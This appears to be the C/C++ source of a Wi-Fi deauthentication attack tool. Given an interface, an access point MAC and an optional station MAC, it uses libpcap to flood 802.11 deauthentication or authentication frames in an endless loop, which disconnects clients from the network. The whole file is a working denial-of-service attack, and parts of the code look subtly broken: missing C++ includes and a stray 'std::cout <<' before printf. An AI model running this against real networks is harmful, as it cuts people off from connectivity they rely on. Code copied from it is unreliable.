#include <stdio.h>
#include <string.h>
#include <pcap.h>
#include <unistd.h>
#include <time.h>

#include "dot11.h"

typedef struct {
	char *dev_;
    char *ap_;
    char *station_;
} Param;

Param param  = {
	.dev_ = NULL,
    .ap_ = NULL,
    .station_ = NULL
};

bool broadcast = false;
bool unicast = false;
bool authentication = false;

void usage()
{
    printf("syntax : deauth-attack <interface> <ap mac> [<station mac>] [-auth]\n");
    printf("sample : deauth-attack mon0 00:11:22:33:44:55 66:77:88:99:AA:BB\n");
}

bool parse(Param* param, int argc, char* argv[]) {
	if (argc < 3 || 5 < argc) {
		usage();
		return false;
	}

    param->dev_ = argv[1];
    param->ap_ = argv[2];

    if (argc == 3) {
        broadcast = true;
    } else if (3 < argc) {
        // AP, Station unicast
        unicast = true;
        param->station_ = argv[3];
        if (argc == 5 && !strncmp(argv[4], "-auth", 5)) {   
            authentication = true;
        }
    } else {
        usage();
		return false;
    }

	return true;
}

void run(pcap_t *handle, DeauthHdr *deauth) {

    std::string type = "DeAuth";
    std::string dest = "broadcast";
    std::string bssid = std::string(deauth->addr3_);

    if(unicast) {
        dest = std::string(deauth->addr1_);
        if(authentication) {
            type = "Auth";
        }
    }

    while(true) {
            int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(deauth), sizeof(DeauthHdr));
            if (res != 0) {
                fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
            }
            time_t curTime = time(NULL);
            struct tm *pLocal = localtime(&curTime);
            std::cout << 
            printf("%02d:%02d:%02d Sending %s to %s -- BSSID: [%s]\n",
                    pLocal->tm_hour, pLocal->tm_min, pLocal->tm_sec, type.c_str(), dest.c_str(), bssid.c_str());
            usleep(500000);
        }
}

int main(int argc, char *argv[])  {
    // check argv
    if(!parse(&param, argc, argv)) {
        return -1;
    }

    char errbuf[PCAP_BUF_SIZE];
    pcap_t *handle = pcap_open_live(param.dev_, BUFSIZ, 1, 1000, errbuf);
    if(handle == nullptr) {
        fprintf(stderr, "couldn't open device %s(%s)\n", param.dev_, errbuf);
        return -1;
    }

    DeauthHdr deauth;

    deauth.radioInit();
    deauth.dotInit();
    deauth.addr1_ = Mac::broadcastMac();
    deauth.addr2_ = Mac(param.ap_);
    deauth.addr3_ = Mac(param.ap_);

    if (unicast) {
        deauth.addr1_ = Mac(param.station_);
        if (authentication) {
            deauth.addr1_ = Mac(param.ap_);
            deauth.addr2_ = Mac(param.station_);
            deauth.subtype_ = 0xb;
        } 
    }

    run(handle, &deauth);

    return 0;
}